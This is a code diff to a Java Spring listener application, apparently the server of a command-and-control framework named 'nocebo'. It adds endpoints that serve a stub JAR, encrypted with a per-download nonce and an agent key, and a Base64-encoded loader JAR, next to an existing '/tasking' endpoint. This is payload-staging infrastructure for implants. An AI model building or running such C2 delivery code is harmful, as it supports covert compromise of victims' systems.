@@ -277,6 +277,53 @@ public class ListenerApplication {
 
 		}
 
+		@RequestMapping("/59013")
+		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
+		ResponseEntity<String> downloadStub() throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		{
+			//encrypt
+			String downloadNonce = String.join(
+				"-", 
+				new String[] {
+					napi.strand(8),
+					napi.strand(4),
+					napi.strand(4),
+					napi.strand(4),
+					napi.strand(12)
+				}
+			);
+
+			HttpHeaders respHeaders = new HttpHeaders();
+			respHeaders.set("uuid", downloadNonce);
+
+			String filePath = String.format("..%s..%sfileroot%slib%sstub.jar",File.separator,File.separator,File.separator,File.separator);
+			byte[] fileData = Files.readAllBytes(Paths.get(filePath));
+			
+			String cData = new String(
+						Base64.getEncoder().encode(
+							sapi.encrypt(
+								fileData,
+								downloadNonce.substring(0,12).replace("-","").getBytes(StandardCharsets.UTF_8),
+								epc.agentKey
+							)
+						)
+					);
+			return new ResponseEntity<String>(cData, respHeaders, HttpStatus.OK);
+		}
+
+		@RequestMapping("/59053")
+		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
+		String downloadILoader() throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		{
+			String filePath = String.format("..%s..%sfileroot%slib%siLoader.jar",File.separator,File.separator,File.separator,File.separator);
+			String cName = new String(
+						Base64.getEncoder().encode(
+							Files.readAllBytes(Paths.get(filePath))
+						)
+					);
+			return cName;
+		}
+
 		@PostMapping("/tasking")
 		String ctrl(@RequestBody noceboApiCommand requestData, @CookieValue("nocebo.auth") String authCookie) throws IOException
 		{
